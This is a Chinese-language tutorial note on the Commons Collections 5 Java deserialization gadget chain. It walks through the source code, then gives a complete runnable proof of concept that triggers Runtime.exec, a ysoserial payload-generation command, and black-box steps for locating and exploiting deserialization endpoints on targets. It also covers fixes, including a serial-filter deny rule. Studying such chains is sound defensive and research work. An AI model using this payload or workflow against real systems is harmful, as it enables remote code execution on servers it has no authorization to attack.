# CC5 利用链（Commons Collections 5 反序列化命令执行链）

> [!abstract] 原理一句话
> 把 `ChainedTransformer` 命令执行链藏进 JDK 自带异常类 `BadAttributeValueExpException` 的 `val` 字段；反序列化恢复该异常时，JDK 会自动对 `val` 调用 `toString()`"贴标签"，这次调用顺着 `TiedMapEntry → LazyMap` 一路传导到 `ChainedTransformer`，反射执行 `Runtime.exec()`。

完整调用顺序（ysoserial 源码原文）：
```text
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

```
getMethod()：找到方法
Method：表示找到的那个方法
invoke()：执行这个方法
```

前置阅读：[[URLDNS利用链]]（先用它探测反序列化入口是否存在）、[[ysoserial使用]]

---
## 1. CC5 是怎么来的

### 1.1 概括

CC5 是 CC1 在高版本 JDK 上的"平替"：CC1 的入口 `sun.reflect.annotation.AnnotationInvocationHandler` 在 JDK 8u71 被官方改写而失效；CC5 把入口换成了 JDK 公开 API `javax.management.BadAttributeValueExpException`（JDK 1.5 就存在，从未被改掉触发逻辑），中后段仍复用 LazyMap → ChainedTransformer 这套命令执行引擎。

### 1.2 比喻

序列化数据像一份「家具组装说明书」，`readObject()` 是组装工人。JDK 规定：组装 `BadAttributeValueExpException` 这件家具时，必须给里面的 `val` 零件**贴标签**（转成字符串，即 `toString()`）。攻击者把一台"通电就自己跑的机器"（TiedMapEntry → LazyMap → ChainedTransformer）塞进零件盒——工人一贴标签，机器就被启动了。**贴标签是 JDK 的规定动作，不是业务代码调用，所以业务方在自己的代码里根本拦不住。**

### 1.3 细节：CC1 的死因与 CC5 的活路

| 对比项 | CC1（LazyMap 版） | CC5 |
|--------|-------------------|-----|
| 入口类 | `sun.reflect.annotation.AnnotationInvocationHandler`（内部类） | `javax.management.BadAttributeValueExpException`（公开 API） |
| JDK 限制 | 8u71+ 失效（readObject 被改写） | ==基本不限==（无 SecurityManager 即可，见 2.1） |
| 中后段链 | 动态代理 invoke → LazyMap.get → ChainedTransformer | TiedMapEntry.toString → LazyMap.get → ChainedTransformer |

> [!note] 说明
> CC5 发现于 CC1 被修复之后，属于 ysoserial 中作者标注为 Matthias Kaiser / Jasinner 的链。它的意义在于证明：**只要命令执行引擎（commons-collections 的 Transformer 体系）还在 classpath 上，换一个入口类就能绕过 JDK 侧的补丁**——修入口修不死，得修库本身。

---

## 2. 原理跟踪：逐段源码走读

### 2.1 入口：BadAttributeValueExpException.readObject()（JDK 8 源码）

```java
// javax.management.BadAttributeValueExpException —— JDK 自带异常类
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);      // ⭐ 从序列化流里取出 val 字段（我们埋的 TiedMapEntry）

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val = valObj;                         // String 本身就是字符串，直接存
    } else if (System.getSecurityManager() == null   // ⭐ 关键条件：没装 SecurityManager（Web 应用默认就没有）
            || valObj instanceof Long || valObj instanceof Integer
            || valObj instanceof Float || valObj instanceof Double
            || valObj instanceof Byte || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();              // ⭐⭐ 触发点！对 TiedMapEntry 调用 toString()
    } else {
        // 有 SecurityManager 且不是包装类型 → 不调 toString（JDK-8019292 修复分支）
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

- 这段是 JDK-8019292 修复**之后**的形态：多出了 SecurityManager 判断。只要目标没装 SecurityManager（绝大多数 Java Web 应用默认不装），`toString()` 照调——这就是 ysoserial 源码注释 *"This only works in JDK 8u76 and WITHOUT a security manager"* 的出处。
- 构造器同样是坑：`this.val = val == null ? null : val.toString();`——直接 `new BadAttributeValueExpException(entry)` 会在**攻击机本地**提前引爆，见 4.2。
- 入口类是 `javax.management` 包的公开类，不是 `sun.*` 内部类，跨 JDK 小版本稳定——这是 CC5 的核心卖点。

### 2.2 跳板：TiedMapEntry.toString() / getValue()（commons-collections 3.2.1）

```java
// org.apache.commons.collections.keyvalue.TiedMapEntry
public String toString() {
    return new StringBuffer(128)
        .append(getKey())      // 拼接 key（"foo"，无害）
        .append('=')
        .append(getValue())    // ⭐⭐ 字符串拼接必然对 value 求值 → 调用 getValue()
        .toString();
}

public Object getValue() {
    return map.get(key);       // ⭐ 委托给内部 map 的 get —— 这个 map 是我们埋的 LazyMap
}
```

- `TiedMapEntry` 的本意是"绑定了一个 map 和 key 的 Entry"，让 Entry 对象脱离原 map 也能取值。
- 为了打印 `key=value` 形式，`toString()` 必须对 value 求值 → `map.get(key)`。
- 这一层是纯跳板：把上游的 **toString 调用** 翻译成 **get 调用**。

### 2.3 懒加载陷阱：LazyMap.get()

```java
// org.apache.commons.collections.map.LazyMap
public Object get(Object key) {
    if (map.containsKey(key) == false) {       // innerMap 是空 HashMap，必然不含 "foo" → 条件成立
        Object value = factory.transform(key); // ⭐⭐ 查不到就现场"造"一个 → 触发 Transformer 链！
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

- LazyMap 的设计本意是**懒加载缓存**：get 一个不存在的 key 时，用 factory 现场生成 value 并写回缓存。
- 攻击者把 factory 指定为 `ChainedTransformer` 之后，"造 value"这个动作就等价于"执行命令"。
- 前提条件：innerMap 里**没有**这个 key。POC 用空 HashMap + key `"foo"`，必然满足。

### 2.4 命令执行引擎：ChainedTransformer + InvokerTransformer

```java
// org.apache.commons.collections.functors.ChainedTransformer —— 责任链
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);  // ⭐ 上一个的输出是下一个的输入
    }
    return object;
}

// org.apache.commons.collections.functors.InvokerTransformer —— 泛化反射器
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);  // ⭐ 反射获取方法
        return method.invoke(input, iArgs);                       // ⭐ 反射调用
    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName
                + "' does not exist in '" + cls + "'");
    } // 其余异常处理略
}
```

- `InvokerTransformer` 是"对任意对象调用任意方法"的封装：方法名、参数类型、参数值全部存在**字段**里，而字段会随对象一起被序列化——所以序列化流本身就携带了"要执行什么命令"。
- `ChainedTransformer` 把多个 Transformer 串成流水线，完成多步反射接力。

### 2.5 Transformer 流水线四步曲

| 步骤  | Transformer                          | 动作                                        | 输出             |
| --- | ------------------------------------ | ----------------------------------------- | -------------- |
| ①   | `ConstantTransformer(Runtime.class)` | 丢弃输入，固定返回 <br>`Runtime.class`             | `Class` 对象     |
| ②   | `InvokerTransformer("getMethod", …)` | Runtime.class.<br>getMethod("getRuntime") | `Method` 对象    |
| ③   | `InvokerTransformer("invoke", …)`    | `method.invoke(null)`<br>（静态方法不需要实例）      | `Runtime` 实例   |
| ④   | `InvokerTransformer("exec", …)`      | `runtime.exec("calc")`                    | `Process`，命令执行 |

> [!important] 为什么绕这么大一圈？
> - `Runtime` 类**没有实现 Serializable**，不能把 Runtime 实例直接埋进序列化流；但 `Runtime.class`（Class 对象）可以序列化，所以用 `ConstantTransformer` 把它"合法"地送进链，命令执行时再现场反射取实例。
> - `getRuntime()` 是 public static 方法，`getMethod` 只找 public 方法即可拿到，不需要 `setAccessible(true)`。
> - 每一步的输出恰好是下一步 `input.getClass()` 的载体——反射链条环环相扣，缺一环就断。

---

## 3. 触发条件

| 条件 | 说明 | 黑盒怎么判断 |
|------|------|--------------|
| classpath 上有 commons-collections 3.0~3.2.1 | 命令执行引擎依赖 | 报错堆栈泄露包名、依赖指纹、已知组件版本 |
| 存在反序列化入口 | 业务代码对用户可控数据调用 `ObjectInputStream.readObject()` | 流量中出现 `rO0AB`（Base64）或 `AC ED 00 05`（二进制头） |
| 无 SecurityManager | 有 SM 时走 `identityHashCode` 分支，不调 toString | Java Web 应用默认不装，通常满足 |
| JDK 版本 | ==基本不限==（类自 JDK 1.5 存在；ysoserial 标注 8u76+ 只是作者测试基准） | — |

> [!warning] 环境边界
> - commons-collections **3.2.2+ / collections4 4.1+** 加了 functor 反序列化防护，链直接断（见第 5 节）。
> - collections4 4.0 同样存在等价链（包名换成 `org.apache.commons.collections4`），思路完全一致。

---

## 4. 实操复现

### 4.1 环境准备

- JDK 8：本机路径 `D:\code\Env\java8\JDK`（⭐ 反序列化实验统一用 JDK 8：JDK 9+ 模块系统会让 `setAccessible` 反射 JDK 内部类字段失败，需要额外的 `--add-opens`，没必要自找麻烦）
- commons-collections 3.2.1 jar：Maven 中央仓库 / 阿里云镜像下载，如 `D:\code\libs\commons-collections-3.2.1.jar`
- IDEA（打断点跟调用链用）

### 4.2 手写 POC（完整可运行）

```java
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

public class CC5Poc {
    public static void main(String[] args) throws Exception {
        // ⭐ 第一步：先造"哑弹"链——组装期占位，防止任何意外的 toString 提前引爆
        ChainedTransformer chain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        // ⭐ 第二步：准备好真引信（四步反射接力，见 2.5 表格）
        Transformer[] realChain = new Transformer[]{
                new ConstantTransformer(Runtime.class),                 // ① 送入 Runtime.class
                new InvokerTransformer("getMethod",
                        new Class[]{ String.class, Class[].class },
                        new Object[]{ "getRuntime", new Class[0] }),    // ② getMethod("getRuntime")
                new InvokerTransformer("invoke",
                        new Class[]{ Object.class, Object[].class },
                        new Object[]{ null, new Object[0] }),           // ③ invoke(null) 拿 Runtime 实例
                new InvokerTransformer("exec",
                        new Class[]{ String.class },
                        new Object[]{ "calc" }),                        // ④ exec("calc") 弹计算器
                new ConstantTransformer(1) };                           // ⑤ 收尾：吞掉 Process 返回值

        // ⭐ 第三步：LazyMap 装饰 + TiedMapEntry 包装
        Map innerMap = new HashMap();                       // 空 map，保证 get("foo") 必然触发 transform
        Map lazyMap = LazyMap.decorate(innerMap, chain);    // factory = 哑弹链
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        // ⭐ 第四步：构造异常对象——必须传 null！
        // 构造器源码：this.val = val == null ? null : val.toString();
        // 直接传 entry 会在攻击机本地就触发一次命令执行
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valField = val.getClass().getDeclaredField("val");
        valField.setAccessible(true);          // ⭐ 反射把 val 字段替换成 TiedMapEntry
        valField.set(val, entry);

        // ⭐ 第五步：离手前换真引信——反射替换 ChainedTransformer 内部的数组
        Field tfField = ChainedTransformer.class.getDeclaredField("iTransformers");
        tfField.setAccessible(true);
        tfField.set(chain, realChain);

        // ⭐ 第六步：序列化落盘
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(val);
        oos.close();
        try (FileOutputStream fos = new FileOutputStream("cc5.bin")) {
            fos.write(bos.toByteArray());      // 文件头即 AC ED 00 05
        }
        System.out.println("payload 写入 cc5.bin，大小：" + bos.size());

        // ⭐ 第七步：本地反序列化验证（模拟服务端 readObject）
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc5.bin"));
        ois.readObject();                      // 💥 断点打在这附近，单步进入即可看到完整链
    }
}
```

编译运行（裸 javac 方式，JDK 8 + jar 在 classpath）：

```bash
# ⭐ 编译（-encoding UTF-8 防止中文注释乱码）
"D:\code\Env\java8\JDK\bin\javac" -encoding UTF-8 -cp "D:\code\libs\commons-collections-3.2.1.jar" CC5Poc.java

# ⭐ 运行（Windows 下 classpath 分隔符是分号）
"D:\code\Env\java8\JDK\bin\java" -cp ".;D:\code\libs\commons-collections-3.2.1.jar" CC5Poc
```

> [!bug] 两个新手必踩的坑
> ① **构造器陷阱**：`new BadAttributeValueExpException(entry)` 直接传 entry → 构造器里 `val.toString()` → ==攻击机自己弹计算器==。必须传 null，再用反射改 val 字段。
> ② **哑弹换装的原因**：组装期任何一次意外的 `toString()` 都会引爆真链——比如 IDEA 调试器查看变量时就会自动调用 `toString()`！所以 ysoserial 用 `ConstantTransformer(1)` 占位、全部组装完再换真链。CC6 里这是硬性要求（`HashSet.add` 会提前触发 `hashCode()`），CC5 属于同款防御性写法。

### 4.3 调试跟踪（原理验证）

按顺序在下表位置打断点，观察数据如何一步步变成命令执行：

| # | 断点位置 | 观察点 |
|---|----------|--------|
| 1 | `BadAttributeValueExpException.readObject` | `valObj` 的类型是 `TiedMapEntry`；单步进入 `valObj.toString()` |
| 2 | `TiedMapEntry.toString` | 字符串拼接走到 `getValue()` |
| 3 | `LazyMap.get` | `containsKey("foo") == false` → 进入 `factory.transform(key)` |
| 4 | `ChainedTransformer.transform` | for 循环 5 次，`object` 从 `Runtime.class` → Method → Runtime 实例 → Process 逐步变身 |
| 5 | `InvokerTransformer.transform` | `method.invoke` 执行前看 `method` 的名字：getMethod → invoke → exec |

反序列化时刻的调用栈（简化，可在断点 5 处直接看到）：

```text
java.lang.Runtime.exec                          ← 💥 命令执行
  sun.reflect.NativeMethodAccessorImpl.invoke0  ← 反射调用
  org.apache.commons.collections.functors.InvokerTransformer.transform
  org.apache.commons.collections.functors.ChainedTransformer.transform   ← 链式循环
  org.apache.commons.collections.map.LazyMap.get                         ← 懒加载触发
  org.apache.commons.collections.keyvalue.TiedMapEntry.getValue          ← get 委托
  org.apache.commons.collections.keyvalue.TiedMapEntry.toString          ← 字符串拼接
  javax.management.BadAttributeValueExpException.readObject              ← ⭐ 入口
  java.io.ObjectInputStream.readObject0
  java.io.ObjectInputStream.readObject
  CC5Poc.main                                    ← 模拟服务端
```

### 4.4 用 ysoserial 一键生成 + 黑盒定位思路

```bash
# ⭐ 生成 CC5 payload（命令按目标场景替换，Linux 下如 "ping xxx.dnslog.cn"）
java -jar ysoserial.jar CommonsCollections5 "calc" > cc5.bin
```

黑盒实战中的定位思路：

1. **找入口**：流量里出现 `rO0AB`（Base64）或 `AC ED 00 05`（原始二进制头，即 Java 序列化魔数 0xACED + 版本 0x0005）→ 存在反序列化点。
2. **探回显**：先打 [[URLDNS利用链]]，DNSLog 收到请求 = 入口确认可达。
3. **验依赖**：确认目标 classpath 有 commons-collections 3.x（报错堆栈、组件指纹、已知 CVE 关联版本）。
4. **上执行**：换 CC5 payload，命令建议先用 DNSLog/延时验证，再考虑交互。

---

## 5. 修复方案

| 层面 | 措施 | 说明 |
|------|------|------|
| 依赖库（根治） | commons-collections 升级到 **3.2.2+**（或 collections4 4.1+） | 危险 functor 的 `readObject` 调用 `FunctorUtils.checkUnsafeSerialization`，未设置系统属性 `org.apache.commons.collections.enableUnsafeSerialization=true` 时直接抛 `UnsupportedOperationException`，链断在第一环 |
| JDK 侧 | JEP 290 序列化过滤器（JDK 9 原生、8u121+ 回移） | 启动参数加黑/白名单，拒绝 CC 危险类 |
| 流量层 | WAF / 接入层检测 | 原始流头 `AC ED 00 05`、Base64 形态 `rO0AB`、超大请求体 |
| 业务层（根治） | 不对不可信数据 `readObject()` | 确需传输复杂结构时改用 JSON 等不含代码语义的协议 |

```bash
# ⭐ JEP 290 过滤器示例：拒绝 CC functors 包的反序列化（! 前缀 = 拒绝）
java -Djdk.serialFilter="!org.apache.commons.collections.functors.*" -jar app.jar
```

> [!important] 关键结论
> CC5 证明了"只修入口不修库"是无效防御：JDK 修掉了 CC1 的入口，攻击者立刻换一个 JDK 自带类当入口。**真正的根因是 classpath 上存在"反序列化即执行"能力的库（commons-collections 的 Transformer 体系），升级依赖版本才是治本。**

---

## 6. CC1 / CC5 / CC6 横向对比

| 对比项 | CC1 | CC5 | CC6 |
|--------|-----|-----|-----|
| 入口 | `AnnotationInvocationHandler.readObject` | `BadAttributeValueExpException.readObject` | `HashSet.readObject` → `HashMap.put` → `hash` |
| 触发动作 | 动态代理 `invoke` → `LazyMap.get` | `toString` → `getValue` → `LazyMap.get` | `TiedMapEntry.hashCode` → `getValue` → `LazyMap.get` |
| JDK 限制 | 8u71+ 失效 | 无（仅需无 SecurityManager） | 无 |
| CC 依赖 | 3.x ≤3.2.1 | 3.x ≤3.2.1 | 3.x ≤3.2.1 |
| 命令执行尾部 | ChainedTransformer | ChainedTransformer | ChainedTransformer |
| 组装期陷阱 | 代理对象构造 | 构造器 toString（传 null 规避） | `HashSet.add` 提前触发 hashCode（哑弹链硬性要求） |

---

## 本篇关联

- 前置知识：[[URLDNS利用链]] —— 反序列化入口探测，黑盒第一步
- 工具使用：[[ysoserial使用]] —— 一键生成 CC5 payload
- 同族利用链：[[CC1利用链]]（动态代理入口，≤ 8u71）、[[CC7利用链]]（hash 碰撞入口）、[[CC6利用链]]（待补笔记）

> 本笔记仅用于授权测试与安全学习，未经授权对他人系统测试属于违法行为。
